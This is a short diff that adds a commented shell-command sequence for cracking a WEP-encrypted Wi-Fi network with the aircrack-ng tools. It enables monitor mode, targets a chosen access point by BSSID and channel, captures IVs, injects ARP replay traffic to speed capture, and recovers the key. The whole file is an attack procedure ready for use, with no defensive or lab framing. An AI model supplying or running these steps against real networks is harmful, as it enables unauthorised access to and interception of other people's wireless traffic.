@@ -1,0 +1,14 @@
+# Put adapter in monitor mode
+airmon-ng start wlan0
+
+# Find your target AP and note BSSID/channel
+airodump-ng wlan0mon
+
+# Capture IVs on target channel
+airodump-ng -c [channel] --bssid [AP_MAC] -w capture wlan0mon
+
+# Speed up IV collection with ARP replay (if traffic is slow)
+aireplay-ng -3 -b [AP_MAC] wlan0mon
+
+# Crack once you have enough IVs (~20-40k minimum, more = faster)
+aircrack-ng capture-01.cap
